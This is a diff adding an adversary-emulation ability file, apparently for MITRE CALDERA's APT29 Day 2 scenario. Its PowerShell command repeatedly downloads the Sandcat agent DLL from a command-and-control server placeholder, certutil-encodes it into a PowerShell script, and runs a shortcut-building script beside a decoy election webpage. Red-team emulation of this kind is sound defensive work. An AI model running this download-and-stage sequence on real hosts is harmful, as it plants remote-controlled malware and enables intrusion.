@@ -1,0 +1,40 @@
+- id: 865b6ad9-ba59-435a-bd8f-641052fc077a
+  name: Host provisioning ability for APT29 Day2 setup
+  description: Download Sandcat DLL and craft payload
+  tactic: host-provision
+  technique:
+      attack_id: T0000
+      name: Host Provisioning
+  platforms:
+    windows:
+      psh,pwsh:
+        timeout: 300
+        command: |
+          @("schemas.ps1","make_lnk.ps1","2016_United_States_presidential_election_-_Wikipedia.html") | Move-Item -Force -Destination "C:\Users\#{profile_user_day2}\Desktop";
+          Move-Item -Force -Path .\MITRE-ATTACK-EVALS.HTML -Destination "C:\Users\#{profile_user_day2}\Documents";
+          Set-Location -Path "C:\Users\#{profile_user_day2}\Desktop";
+
+          $url="#{server}/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $wc.Headers.add("group","red-dll"); $wc.Headers.add("server","#{server}"); while($true) {try {if(($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and -not ([io.file]::WriteAllBytes("C:\\Users\\Public\\$name.dll",$data))) {break}} catch{sleep 60}};
+
+          if(Test-Path -LiteralPath "C:\Users\#{profile_user_day2}\Desktop\blob"){
+            Remove-Item "C:\Users\#{profile_user_day2}\Desktop\blob" -Force;
+            Write-Host "Removed old blob file";
+          }
+
+          Set-ItemProperty -Path schemas.ps1 -Name IsReadOnly -Value $false;
+          Set-ItemProperty -Path 2016_United_States_presidential_election_-_Wikipedia.html -Name IsReadOnly -Value $false;
+
+          certutil -encode "C:\Users\Public\$name.dll" blob;
+
+          (Get-Content .\blob) -join "" | Out-File -NoNewline -FilePath .\blob;
+          $blob = ((Get-Content .\blob) -join "") -replace "`r|`n","";
+
+          (Get-Content schemas.ps1) -replace '\$bin = ""',"`$bin = `"$($blob)`"" | Out-File -FilePath .\schemas.ps1;
+
+          powershell .\make_lnk.ps1;
+
+        cleanup: |
+          @("schemas.ps1","make_lnk.ps1","2016_United_States_presidential_election_-_Wikipedia.html","blob") | Remove-Item -Force -Destination "C:\Users\#{profile_user_day2}\Desktop";
+          Remove-Item -Force -Destination "C:\Users\Public\$name.dll";
+
+        payload: schemas.ps1,make_lnk.ps1,2016_United_States_presidential_election_-_Wikipedia.html,MITRE-ATTACK-EVALS.HTML
